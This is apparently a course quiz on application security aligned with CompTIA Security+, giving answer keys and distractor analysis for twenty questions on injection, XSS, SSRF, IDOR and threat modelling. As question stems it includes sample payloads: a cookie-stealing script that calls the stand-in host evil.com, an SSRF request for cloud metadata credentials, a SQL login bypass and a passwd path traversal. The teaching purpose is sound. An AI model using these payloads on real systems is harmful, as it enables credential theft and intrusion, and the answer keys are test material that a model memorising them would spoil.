# Quiz: Module 10 — Application Security

## Course: CIS-4328 Information Security

**Certification Alignment:** CompTIA Security+ (SY0-701)

---

## Instructions

Select the single best answer for each question. Each question is worth 10 points. This quiz is open-note but must reflect your own work. Questions are written to match the difficulty and style of the CompTIA Security+ SY0-701 exam.

---

## Question 1

A developer builds a login form that constructs the following query at runtime: `SELECT * FROM users WHERE user='` + username + `' AND pass='` + password + `'`. An attacker enters `admin'--` as the username and any value as the password. What type of vulnerability is being exploited?

A) Cross-site scripting

B) SQL injection

C) LDAP injection

D) Session fixation

**Correct Answer:** B

**Distractor Analysis:**

- Why A is incorrect: Cross-site scripting injects client-side script into pages viewed by other users. It does not manipulate database queries or comment out SQL clauses.
- Why C is incorrect: LDAP injection targets LDAP directory service queries. The scenario describes a SQL string being manipulated with SQL comment syntax, which is specific to SQL injection.
- Why D is incorrect: Session fixation involves tricking a victim into using a known session token. It does not involve database query manipulation.

---

## Question 2

A security analyst is reviewing the OWASP Top 10 2021 list and notes that category A01 is Broken Access Control. A junior developer asks what specific flaw allows a user to view another customer's order by changing the numeric order ID in the URL. Which term best describes this flaw?

A) Privilege escalation

B) Session hijacking

C) Insecure Direct Object Reference

D) Server-Side Request Forgery

**Correct Answer:** C

**Distractor Analysis:**

- Why A is incorrect: Privilege escalation means gaining a higher level of access (e.g., user to admin). IDOR is a horizontal access issue — accessing a peer user's data at the same privilege level without going higher.
- Why B is incorrect: Session hijacking involves stealing an authenticated session token to impersonate a user. IDOR does not require stealing a session — the attacker uses their own authenticated session but accesses another user's object.
- Why D is incorrect: SSRF causes the server to make outbound HTTP requests to attacker-controlled destinations. It does not involve manipulating object identifiers in application URLs.

---

## Question 3

A security team is selecting automated testing tools for their CI/CD pipeline. They want a tool that analyzes source code for vulnerabilities before the application is compiled or run. Which tool type should they select?

A) DAST

B) SAST

C) IAST

D) WAF

**Correct Answer:** B

**Distractor Analysis:**

- Why A is incorrect: DAST (Dynamic Application Security Testing) tests the running application by sending crafted inputs. It requires the application to be deployed and executing — source code analysis is not DAST.
- Why C is incorrect: IAST instruments the running application at runtime to observe behavior from within. It does not analyze source code statically before compilation.
- Why D is incorrect: A WAF (Web Application Firewall) is a runtime security control that filters HTTP traffic. It is not a testing tool and does not analyze source code.

---

## Question 4

An organization deploys a web application that fetches a URL provided by the user in a form field. An attacker submits `http://169.254.169.254/latest/meta-data/iam/security-credentials/` as the URL. The application retrieves and displays the response. Which OWASP Top 10 category does this attack represent?

A) A05 — Security Misconfiguration

B) A03 — Injection

C) A10 — Server-Side Request Forgery

D) A02 — Cryptographic Failures

**Correct Answer:** C

**Distractor Analysis:**

- Why A is incorrect: Security misconfiguration involves improper system configuration, such as default credentials or open storage buckets. The attack here exploits the application's outbound fetch behavior, not a misconfiguration of a service.
- Why B is incorrect: Injection involves embedding malicious commands in interpreter inputs. SSRF forces the server to make outbound requests — the exploit is about the destination of the request, not injection into a query language.
- Why D is incorrect: Cryptographic failures involve inadequate protection of data in transit or at rest. This attack uses no cryptographic mechanism — it exploits the server's HTTP fetch capability.

---

## Question 5

A software vendor signs all released binaries with a code-signing certificate issued by a trusted CA. After a security incident, investigators discover that the released binary contains malware. The binary's digital signature is still valid. Which scenario best explains how this is possible?

A) The CA revoked the certificate before the signing occurred.

B) The attacker forged the digital signature by cracking the vendor's public key.

C) The vendor's build environment was compromised, and malware was injected before signing.

D) The hash algorithm used was MD5, which allowed collision.

**Correct Answer:** C

**Distractor Analysis:**

- Why A is incorrect: If the certificate were revoked before signing, the signature would be invalid, not valid. A valid signature confirms the certificate was active at signing time.
- Why B is incorrect: Modern RSA and ECDSA private keys are computationally infeasible to crack. Forging a signature by factoring the private key is not a realistic attack vector.
- Why D is incorrect: While MD5 collision attacks exist, producing a signed binary with a meaningful malicious payload via a hash collision is practically infeasible. The SolarWinds attack, which this scenario describes, involved build environment compromise, not hash collision.

---

## Question 6

A developer stores user passwords by converting them to lowercase and applying MD5 before storing in the database. Which two weaknesses does this approach introduce? (Choose two — select the answer that lists both correct weaknesses.)

A) Passwords are not salted, enabling rainbow table attacks; MD5 is a fast hash not designed for password storage

B) MD5 is reversible encryption, not a hash; passwords should be stored as SHA-256

C) Passwords are truncated to lowercase, violating NIST length guidelines; SHA-1 is stronger than MD5

D) MD5 is too slow for large databases; bcrypt should replace it for performance reasons

**Correct Answer:** A

**Distractor Analysis:**

- Why B is incorrect: MD5 is a cryptographic hash function, not reversible encryption. Saying MD5 is reversible is technically incorrect. SHA-256 is also a fast hash not suitable for passwords.
- Why C is incorrect: NIST SP 800-63B does not prohibit case conversion — it recommends allowing all printable characters. SHA-1 is not stronger than MD5 for password storage; both are unsuitable because both are fast hashes.
- Why D is incorrect: MD5 is fast, which is the weakness — not slowness. bcrypt is preferred because it is deliberately slow, but the reason is security not performance.

---

## Question 7

An organization performs a security review of its software development process. The team discovers that security requirements are not collected until after the application is deployed to production and a pen test reveals vulnerabilities. Which concept does this violate?

A) Defense in depth

B) Shift-left security

C) Zero trust

D) Separation of duties

**Correct Answer:** B

**Distractor Analysis:**

- Why A is incorrect: Defense in depth is an architectural principle of layered controls. Collecting security requirements late is a lifecycle process failure, not a missing layer of controls.
- Why C is incorrect: Zero trust is a network and access architecture principle requiring continuous verification. It does not govern when in the SDLC security activities occur.
- Why D is incorrect: Separation of duties requires that no single person controls an entire sensitive workflow. Timing of security requirements collection is an SDLC process issue, not a privilege separation issue.

---

## Question 8

A web application accepts blog post comments and stores them in a database. Any user who views the post sees the stored comments rendered in the browser. An attacker enters `<script>document.location='http://evil.com/?c='+document.cookie</script>` as a comment. Which XSS type is this, and why?

A) Reflected XSS, because the script is reflected back in the response to the attacker

B) DOM-based XSS, because the script manipulates the Document Object Model directly

C) Stored XSS, because the script is saved in the database and served to all future visitors

D) CSRF, because the script redirects users to another domain

**Correct Answer:** C

**Distractor Analysis:**

- Why A is incorrect: Reflected XSS requires the victim to click a crafted link that includes the payload in the request. In this scenario, the payload is stored in the database and served automatically to all users who view the post — no crafted link is needed.
- Why B is incorrect: DOM-based XSS occurs entirely client-side through JavaScript manipulation of the DOM without server involvement. This attack stores the payload server-side in the database.
- Why D is incorrect: CSRF (Cross-Site Request Forgery) tricks authenticated users into submitting unintended requests using their existing session. This attack exfiltrates cookies via a stored script — it is XSS, not CSRF.

---

## Question 9

A threat model is being created for a new application that processes financial transactions. The team identifies a risk that an employee in the Finance department with read-only access could modify transaction records. Which STRIDE threat category does this represent?

A) Spoofing

B) Tampering

C) Repudiation

D) Elevation of Privilege

**Correct Answer:** D

**Distractor Analysis:**

- Why A is incorrect: Spoofing involves impersonating another user or system identity. In this scenario, the employee is acting as themselves — the risk is that they can perform actions beyond their read-only permission level.
- Why B is incorrect: Tampering involves unauthorized modification of data. While modifying transaction records is tampering, the STRIDE category that best captures the root cause — a user performing actions beyond their assigned permissions — is Elevation of Privilege.
- Why C is incorrect: Repudiation involves denying having performed an action, which requires logging and non-repudiation controls. The scenario describes a privilege scope issue, not a logging or denial issue.

---

## Question 10

A DevSecOps team adds a stage to their CI/CD pipeline that sends crafted HTTP requests to the deployed staging application and analyzes the responses for vulnerability indicators. No source code access is used. Which tool type did the team integrate?

A) SAST

B) IAST

C) DAST

D) SCA (Software Composition Analysis)

**Correct Answer:** C

**Distractor Analysis:**

- Why A is incorrect: SAST (Static Application Security Testing) requires access to source code or compiled binaries and does not execute the application. The scenario explicitly states the tool sends HTTP requests to a deployed application without source code access.
- Why B is incorrect: IAST instruments the running application from within by inserting an agent. The scenario describes external HTTP request crafting, which is the DAST approach, not internal instrumentation.
- Why D is incorrect: SCA (Software Composition Analysis) scans dependency manifests and packages to identify components with known CVEs. It does not send HTTP requests to a running application to test for vulnerabilities.

---

---

## Question 11

A developer receives a bug report that users can access administrative functions by navigating directly to `/admin/deleteUser?id=42` without any authentication check. The navigation link to this page is hidden from normal users, but the endpoint itself enforces no access control. Which term describes the developer's flawed security assumption?

A) Security through obscurity

B) Defense in depth

C) Secure by default

D) Separation of duties

**Correct Answer:** A

**Distractor Analysis:**

- Why B is incorrect: Defense in depth is an architectural principle of layered controls. Relying on hiding a link as the sole access control is the opposite — it is a single-layer assumption that obscurity equals security.
- Why C is incorrect: Secure by default means access is denied unless explicitly granted. The endpoint described grants access to anyone who knows the URL — the default is permissive, not secure.
- Why D is incorrect: Separation of duties prevents a single person from controlling a sensitive workflow. The issue here is missing access control enforcement on a specific endpoint, not a workflow privilege design problem.

---

## Question 12

A security team is performing a threat model for a new payments API. They identify a scenario where a malicious insider could submit a transaction, approve it, and confirm receipt — completing the entire sensitive workflow without any second review. Which STRIDE category best describes this threat?

A) Spoofing

B) Tampering

C) Information Disclosure

D) Elevation of Privilege

**Correct Answer:** D

**Distractor Analysis:**

- Why A is incorrect: Spoofing involves impersonating another identity. The insider is acting as themselves — the threat is that they have too much authority over a sensitive process.
- Why B is incorrect: Tampering involves unauthorized modification of data or code. The insider is performing authorized actions — the design flaw is that no separation of duties prevents a single person from controlling the entire transaction workflow.
- Why C is incorrect: Information Disclosure involves exposing data to unauthorized parties. The scenario describes a privilege and workflow control failure, not unauthorized data exposure.

---

## Question 13

A web application renders user-supplied search terms back in the response without encoding them: `<h2>Results for: [search term]</h2>`. An attacker crafts a malicious URL containing a script payload in the search parameter and sends it to a victim. Which XSS subtype is this, and what is the correct server-side countermeasure?

A) Stored XSS; prevent it by sanitizing inputs before database storage

B) DOM-based XSS; prevent it by using textContent instead of innerHTML in client-side JavaScript

C) Reflected XSS; prevent it by HTML-encoding all user-supplied values before rendering them in server-side responses

D) Blind XSS; prevent it by deploying a content security policy

**Correct Answer:** C

**Distractor Analysis:**

- Why A is incorrect: Stored XSS requires the payload to be saved to a database and then served to other users. In this scenario, the payload is reflected immediately in the response — it is never persisted.
- Why B is incorrect: DOM-based XSS occurs entirely in the browser through client-side JavaScript reading from the DOM. The scenario describes the server rendering the term directly in the HTML response — this is server-side reflection.
- Why D is incorrect: Blind XSS occurs when the payload executes in an administrative interface the attacker cannot observe. The scenario describes a standard reflected scenario with visible output. CSP is a useful defense-in-depth control but does not address the root cause of unencoded output.

---

## Question 14

A penetration tester discovers that a web application passes a file path provided by the user directly to a server-side file read function: `open('/var/app/reports/' + user_input)`. The tester enters `../../etc/passwd` as the input and successfully reads the system password file. Which vulnerability is this?

A) Remote code execution

B) Server-Side Request Forgery

C) Path traversal (directory traversal)

D) Local file inclusion

**Correct Answer:** C

**Distractor Analysis:**

- Why A is incorrect: Remote code execution allows the attacker to run arbitrary commands on the server. Reading a file via path traversal retrieves existing file contents but does not execute code.
- Why B is incorrect: SSRF forces the server to make outbound HTTP requests to attacker-controlled destinations. Path traversal exploits the local file system via relative path manipulation, not outbound HTTP requests.
- Why D is incorrect: Local File Inclusion (LFI) specifically refers to including and potentially executing local files via vulnerable include/require functions in PHP-style applications. Path traversal is the broader, more precise term for this scenario where a file path is manipulated using `../` sequences to escape the intended directory.

---

## Question 15

A DevSecOps team adds Software Composition Analysis (SCA) to their CI/CD pipeline. A build fails because a transitive dependency — a library used by a library the application directly imports — contains a critical CVE. The development team argues they never directly chose this library and should not be responsible for patching it. Which statement best addresses this argument?

A) The team is correct — indirect dependencies are the responsibility of the library vendor, not the application developer.

B) The team must address the vulnerability because the transitive dependency is compiled into their application and its vulnerabilities become theirs at runtime.

C) SCA tools only report direct dependencies; the failure is a tool misconfiguration and should be suppressed.

D) Transitive dependencies cannot be patched without forking the intermediate library's source code, making remediation infeasible.

**Correct Answer:** B

**Distractor Analysis:**

- Why A is incorrect: When a vulnerable transitive dependency is packaged into an application, an attacker exploiting that CVE is exploiting the application. Legal and regulatory frameworks (GDPR, PCI-DSS, HIPAA) hold the organization responsible for vulnerabilities in their deployed software regardless of origin.
- Why C is incorrect: Modern SCA tools (Snyk, Dependabot, OWASP Dependency-Check) explicitly scan the full dependency tree including transitive dependencies. Suppressing valid findings increases risk and creates compliance exposure.
- Why D is incorrect: Most transitive dependency vulnerabilities are addressed by updating the intermediate library to a version that depends on a patched version of the transitive library. Forking is rarely necessary.

---

## Question 16

An application uses JWT tokens for session management. A developer sets the token expiration to 30 days to reduce user re-authentication frequency. A security reviewer flags this as a risk. What specific attack does a long-lived JWT token facilitate that a short-lived token with refresh token rotation mitigates?

A) Token forgery via algorithm confusion between RS256 and HS256

B) Replay attack using a stolen token — a compromised token remains valid for 30 days with no ability to revoke it server-side

C) SQL injection via malicious claims embedded in the JWT payload

D) CSRF using the JWT as a form submission token

**Correct Answer:** B

**Distractor Analysis:**

- Why A is incorrect: Algorithm confusion attacks exploit misconfigured JWT libraries that accept both asymmetric and symmetric algorithms. This is a library configuration issue, not an expiration issue. A long expiration does not change the algorithm confusion risk.
- Why C is incorrect: JWT claims are URL-safe base64-encoded data. If an application passes JWT claims directly to a database query without parameterization, SQL injection is possible — but this is an application coding error, not a property of the token's expiration period.
- Why D is incorrect: CSRF attacks are not prevented or enabled by JWT expiration. JWTs stored in HttpOnly cookies have different CSRF exposure than localStorage-stored tokens, but token lifetime is not the primary CSRF variable.

---

## Question 17

A mobile banking application stores the user's session token in the device's cleartext local storage. A security researcher reports that on a rooted Android device, any application with file system access can read the token. What is the PRIMARY secure storage recommendation for sensitive tokens on Android?

A) Store the token in a global SharedPreferences file accessible to all apps

B) Use the Android Keystore system to store cryptographic keys and encrypt the token before storage

C) Encode the token in Base64 before writing to local storage to prevent direct reading

D) Store the token in the application's network cache with a short TTL

**Correct Answer:** B

**Distractor Analysis:**

- Why A is incorrect: Global SharedPreferences are readable by other applications on rooted devices and even without root in some legacy configurations. This does not address the threat.
- Why C is incorrect: Base64 encoding is not encryption — it is a reversible encoding scheme. Anyone who reads the encoded token can trivially decode it. Encoding does not provide confidentiality.
- Why D is incorrect: Network cache is intended for HTTP response caching and is not a secure credential store. Cache entries may be stored unencrypted in application files and are not protected by the Keystore.

---

## Question 18

An application uses the following password reset flow: (1) user requests a reset; (2) a reset token is emailed; (3) the user clicks the link containing the token; (4) the application accepts the token and allows a password change. A security review finds that the token never expires and is not invalidated after use. Which two vulnerabilities does this create?

A) The unexpired token enables brute-force attacks; the non-invalidated token enables replay attacks

B) The unexpired token enables privilege escalation; the non-invalidated token enables session fixation

C) The unexpired token creates a denial of service risk; the non-invalidated token enables CSRF

D) The unexpired token violates GDPR; the non-invalidated token violates HIPAA

**Correct Answer:** A

**Distractor Analysis:**

- Why B is incorrect: Privilege escalation involves gaining higher permissions. Session fixation involves forcing a victim to use a known session token. Neither directly describes the risks of a non-expiring or non-invalidating password reset token.
- Why C is incorrect: A non-expiring reset token does not create a DoS risk — it does not consume server resources by existing. CSRF involves tricking users into submitting unintended requests using their authenticated session, not exploiting reset tokens.
- Why D is incorrect: While insecure password reset flows may be relevant to regulatory compliance, the specific technical vulnerabilities are not regulatory violations themselves — they are security design failures. Compliance violations are the consequence, not the vulnerability type.

---

## Question 19

A security engineer conducting a code review finds that an API endpoint performs authorization checks on GET requests but omits the check for the same endpoint when accessed via the PUT method. An attacker who discovers this can modify resources they are only authorized to read. Which term describes this vulnerability pattern?

A) Mass assignment

B) HTTP method-based authorization bypass

C) Insecure Deserialization

D) Race condition

**Correct Answer:** B

**Distractor Analysis:**

- Why A is incorrect: Mass assignment occurs when an application automatically binds all parameters from a request to an object model, allowing attackers to set fields the developer did not intend to expose. This scenario describes selective authorization enforcement by HTTP method, not unintended parameter binding.
- Why C is incorrect: Insecure deserialization occurs when an application deserializes untrusted data without validation, potentially allowing object injection or remote code execution. The scenario does not involve serialization.
- Why D is incorrect: A race condition occurs when concurrent requests exploit a time-of-check to time-of-use gap. The scenario describes a consistent, predictable authorization gap tied to HTTP method, not a timing vulnerability.

---

## Question 20

A threat modeling exercise using the STRIDE framework identifies a scenario where an attacker intercepts and modifies API responses between a mobile app and its backend server to change a price field from $499 to $0. Which STRIDE category describes this threat, and which control directly addresses it?

A) Spoofing; mitigated by strong authentication of the API server

B) Tampering; mitigated by TLS for transport integrity and server-side validation of all business logic inputs

C) Repudiation; mitigated by logging all API transactions with timestamps

D) Information Disclosure; mitigated by encrypting the API response payload

**Correct Answer:** B

**Distractor Analysis:**

- Why A is incorrect: Spoofing involves impersonating an identity. Intercepting and modifying data in transit is Tampering. Strong authentication of the API server helps with Spoofing but does not prevent a man-in-the-middle from modifying payload content if TLS is not in use.
- Why C is incorrect: Repudiation involves denying that an action occurred. Logging creates audit trails for Repudiation threats. The scenario describes unauthorized modification of data in transit — this is Tampering, not Repudiation.
- Why D is incorrect: Information Disclosure involves exposing data to unauthorized parties. The threat here is not exposure of the price value (the app already sees it) but unauthorized modification of it. Encryption of the payload addresses confidentiality but TLS also provides integrity protection — the full answer requires both TLS and server-side validation.

---

*End of Quiz — Module 10*
